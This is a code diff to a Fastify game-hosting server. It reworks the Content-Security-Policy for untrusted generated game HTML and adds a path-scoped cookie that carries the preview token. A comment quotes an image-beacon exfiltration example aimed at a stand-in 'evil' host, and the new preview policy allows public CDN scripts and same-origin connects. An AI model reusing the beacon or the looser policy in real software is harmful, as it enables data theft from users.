@@ -90,11 +90,15 @@ function autoMod(title: string, html: string): string[] {
   return flags;
 }
 
+const PREVIEW_AUTH_COOKIE = 'pf_preview_auth';
+const PREVIEW_AUTH_COOKIE_MAX_AGE_SECONDS = 60 * 60;
+
 /**
- * Content-Security-Policy for SERVED, UNTRUSTED game HTML — both the live
- * `/preview` files and the published `/play` bundles. Generated game code is
- * untrusted, so this header is the real anti-exfil boundary (plan §7), not a
- * nicety. One helper so preview and play can never drift apart.
+ * Content-Security-Policy for SERVED, UNTRUSTED game HTML. Published `/play`
+ * bundles are self-contained single-file HTML, while live `/preview` snapshots
+ * are multi-file and may load their generated `src/main.js` plus engine modules.
+ * Generated game code is untrusted, so these headers are the real anti-exfil
+ * boundary (plan §7), not a nicety.
  *
  *  - default-src 'none'                  — deny-by-default; only the lines below open.
  *  - script-src 'unsafe-inline' data: blob: — single-file bundles inline scripts;
@@ -103,9 +107,29 @@ function autoMod(title: string, html: string): string[] {
  *      hostile game exfiltrate via an image beacon
  *      (`new Image().src='https://evil/?'+secret`), silently defeating
  *      connect-src 'none'. These MUST stay locked to self/data/blob.
- *  - connect-src 'none'                  — block fetch/XHR/WebSocket/EventSource exfil.
+ *  - connect-src                         — published games use 'none'; preview uses
+ *                                          'self' for same-origin dev assets only.
  */
-function gameContentCsp(frameAncestors: string): string {
+function gameContentCsp(
+  frameAncestors: string,
+  mode: 'single-file' | 'preview-multifile' = 'single-file',
+): string {
+  if (mode === 'preview-multifile') {
+    return [
+      "default-src 'none'",
+      "script-src 'self' 'unsafe-inline' data: blob: https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com https://cdn.skypack.dev",
+      "style-src 'self' 'unsafe-inline'",
+      "img-src 'self' data: blob:",
+      "media-src 'self' data: blob:",
+      "font-src 'self' data:",
+      "worker-src 'self' blob:",
+      "connect-src 'self'",
+      "base-uri 'none'",
+      "form-action 'none'",
+      `frame-ancestors ${frameAncestors}`,
+    ].join('; ');
+  }
+
   return [
     "default-src 'none'",
     "script-src 'unsafe-inline' data: blob:",
@@ -115,8 +139,77 @@ function gameContentCsp(frameAncestors: string): string {
     'font-src data:',
     'worker-src blob:',
     "connect-src 'none'",
+    "base-uri 'none'",
+    "form-action 'none'",
     `frame-ancestors ${frameAncestors}`,
   ].join('; ');
+}
+
+function firstQueryValue(req: FastifyRequest, key: string): string | undefined {
+  const query = req.query as Record<string, string | string[] | undefined>;
+  const value = query[key];
+  const first = Array.isArray(value) ? value[0] : value;
+  return first && first.length > 0 ? first : undefined;
+}
+
+function readCookie(cookieHeader: string | string[] | undefined, name: string): string | undefined {
+  const rawHeader = Array.isArray(cookieHeader) ? cookieHeader.join('; ') : cookieHeader;
+  if (!rawHeader) return undefined;
+
+  for (const part of rawHeader.split(';')) {
+    const trimmed = part.trim();
+    const separator = trimmed.indexOf('=');
+    if (separator <= 0) continue;
+    if (trimmed.slice(0, separator) !== name) continue;
+    try {
+      return decodeURIComponent(trimmed.slice(separator + 1));
+    } catch {
+      return undefined;
+    }
+  }
+
+  return undefined;
+}
+
+function previewAuthCookieValue(req: FastifyRequest): string | null {
+  const token = firstQueryValue(req, 'token');
+  if (token) return `token:${token}`;
+
+  const userId = firstQueryValue(req, 'userId');
+  if (userId) return `user:${userId}`;
+
+  return null;
+}
+
+function previewAuthCookieHeader(runId: string, value: string): string {
+  return [
+    `${PREVIEW_AUTH_COOKIE}=${encodeURIComponent(value)}`,
+    `Path=/v1/runs/${encodeURIComponent(runId)}/preview/`,
+    `Max-Age=${PREVIEW_AUTH_COOKIE_MAX_AGE_SECONDS}`,
+    'HttpOnly',
+    'SameSite=Lax',
+  ].join('; ');
+}
+
+function applyPreviewCookieAuth(
+  hdrs: Record<string, string | string[] | undefined>,
+  cookieValue: string | undefined,
+): void {
+  if (!cookieValue) return;
+
+  const separator = cookieValue.indexOf(':');
+  if (separator <= 0) return;
+
+  const kind = cookieValue.slice(0, separator);
+  const value = cookieValue.slice(separator + 1);
+  if (!value) return;
+
+  if (kind === 'token' && !hdrs['authorization']) {
+    hdrs['authorization'] = `Bearer ${value}`;
+  }
+  if (kind === 'user' && !hdrs['x-user-id']) {
+    hdrs['x-user-id'] = value;
+  }
 }
 
 /** Minimal payload the API passes to the generation queue. */
@@ -534,19 +627,26 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
    * (dev HeaderAuth) query param is accepted ONLY on routes that opt in via
    * `allowQueryToken` — the SSE stream, the run preview, and the presence/collab
    * WebSockets. Honoring it on every route would leak the session token into
-   * URLs and access logs platform-wide (#21a). Returns the user or null.
+   * URLs and access logs platform-wide (#21a).
+   *
+   * `allowPreviewCookie` is only for preview subresources. The iframe's first
+   * HTML request can carry ?token=, but generated relative URLs cannot inherit
+   * that query string, so the preview route sets a path-scoped HttpOnly cookie.
+   * Returns the user or null.
    */
   async function authenticateRequest(
     req: FastifyRequest,
-    opts?: { allowQueryToken?: boolean },
+    opts?: { allowQueryToken?: boolean; allowPreviewCookie?: boolean },
   ): Promise<AuthedUser | null> {
     const hdrs: Record<string, string | string[] | undefined> = { ...req.headers };
     if (opts?.allowQueryToken) {
-      const q = req.query as Record<string, string | undefined>;
-      const qToken = q['token'];
+      const qToken = firstQueryValue(req, 'token');
       if (qToken && !hdrs['authorization']) hdrs['authorization'] = `Bearer ${qToken}`;
-      const qUserId = q['userId'];
+      const qUserId = firstQueryValue(req, 'userId');
       if (qUserId && !hdrs['x-user-id']) hdrs['x-user-id'] = qUserId;
+    }
+    if (opts?.allowPreviewCookie) {
+      applyPreviewCookieAuth(hdrs, readCookie(req.headers.cookie, PREVIEW_AUTH_COOKIE));
     }
     return deps.auth.authenticate(hdrs);
   }
@@ -554,7 +654,7 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
   async function requireUser(
     req: FastifyRequest,
     reply: FastifyReply,
-    opts?: { allowQueryToken?: boolean },
+    opts?: { allowQueryToken?: boolean; allowPreviewCookie?: boolean },
   ): Promise<AuthedUser | null> {
     const user = await authenticateRequest(req, opts);
     if (!user) {
@@ -1732,14 +1832,21 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
   app.get('/v1/runs/:id/preview/*', async (req, reply) => {
     if (!deps.store) return reply.code(503).send({ error: 'preview_unavailable' });
 
-    const user = await requireUser(req, reply, { allowQueryToken: true });
-    if (!user) return;
     const { id } = req.params as { id: string };
     const filePath = (req.params as Record<string, string>)['*'] || '' || 'index.html';
+    const cookieValue = previewAuthCookieValue(req);
+    const user = await requireUser(req, reply, {
+      allowQueryToken: true,
+      allowPreviewCookie: true,
+    });
+    if (!user) return;
 
     const run = await deps.runRepo.get(id);
     if (!run?.snapshotManifestKey || run.userId !== user.userId) {
       return reply.code(404).send({ error: 'not_found' });
+    }
+    if (cookieValue) {
+      reply.header('Set-Cookie', previewAuthCookieHeader(id, cookieValue));
     }
 
     try {
@@ -1751,12 +1858,14 @@ export function buildServer(deps: ServerDeps): FastifyInstance {
         reply
           .header('Content-Type', ct)
           .header('Cache-Control', 'no-cache')
-          // Apply game CSP to HTML preview files to match the published play route
-          // security model. Use the SAME configured frame-ancestors as the play
-          // route rather than a hardcoded '*', so prod can lock embedding here too. (CSP M2)
+          // Preview HTML is multi-file, so it can load generated same-origin
+          // modules and approved engine CDNs while preserving the same embedding
+          // restrictions as the published play route. (CSP M2)
           .header(
             'Content-Security-Policy',
-            isHtml ? gameContentCsp(deps.allowedFrameOrigins ?? '*') : "default-src 'none'",
+            isHtml
+              ? gameContentCsp(deps.allowedFrameOrigins ?? '*', 'preview-multifile')
+              : "default-src 'none'",
           )
           .header('X-Content-Type-Options', 'nosniff')
           .header('Referrer-Policy', 'no-referrer')
